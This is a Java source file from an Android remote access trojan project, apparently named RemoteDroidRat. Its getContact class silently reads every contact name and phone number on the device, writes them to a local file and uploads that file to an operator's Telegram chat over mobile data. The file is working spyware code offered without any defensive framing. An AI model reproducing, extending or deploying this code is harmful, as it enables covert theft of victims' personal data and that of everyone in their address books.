package com.KaranKumar.RemoteDroidRat.commandActions;
import android.provider.ContactsContract;
import android.database.Cursor;
import java.io.FileWriter;
import java.io.IOException;
import java.io.File;
import android.content.Context;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import com.KaranKumar.RemoteDroidRat.telegramBot.TelegramBotApi;
import com.KaranKumar.RemoteDroidRat.adminInfo;

public class getContact {
	Context context;
	TelegramBotApi telegramBot;
	adminInfo admin;
	public getContact(Context context) {
		if (context != null) {
			this.context = context;
			this.telegramBot = new TelegramBotApi(context);
			this.admin = new adminInfo(context);
			// Handle other initialization tasks if needed.
		} else {
			// Handle the case where context is null, log an error, or throw an exception.
		}
	}
	
    public void fetchAndSaveContacts() {
        try {
            // Fetch contacts
            Cursor cursor = context.getContentResolver().query(
				ContactsContract.Contacts.CONTENT_URI,
				null,
				null,
				null,
				null
            );

            if (cursor != null && cursor.getCount() > 0) {
                while (cursor.moveToNext()) {
                    String contactId = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
                    String contactName = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));

                    // Fetch phone number
                    Cursor phoneCursor = context.getContentResolver().query(
						ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
						null,
						ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
						new String[]{contactId},
						null
                    );

                    String phoneNumber = "";
                    if (phoneCursor != null && phoneCursor.moveToFirst()) {
                        phoneNumber = phoneCursor.getString(phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                    }

                    if (phoneCursor != null) {
                        phoneCursor.close();
                    }

                    // Save to text file
                    saveContactToFile(contactName, phoneNumber);
                }
                cursor.close();
            }

            // Send to Telegram Bot
            sendToTelegramBot(admin.getChatId(),context.getFilesDir() + File.separator + "contacts.txt");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void saveContactToFile(String contactName, String phoneNumber) {
        try {
            FileWriter fileWriter = new FileWriter(context.getFilesDir() + File.separator + "contacts.txt", true);
            fileWriter.append("Name: " + contactName + ", Phone: " + phoneNumber + "\n");
            fileWriter.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void sendToTelegramBot(String chatId, String file) {
		
		if(isNetworkConnected()){
			
			telegramBot.sendFile(chatId,file);
		}
   
	}
    private boolean isNetworkConnected() {
        ConnectivityManager connectivityManager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo mobileNetworkInfo = connectivityManager.getNetworkInfo(ConnectivityManager.TYPE_MOBILE);
        return mobileNetworkInfo != null && mobileNetworkInfo.isConnected();
    }
}
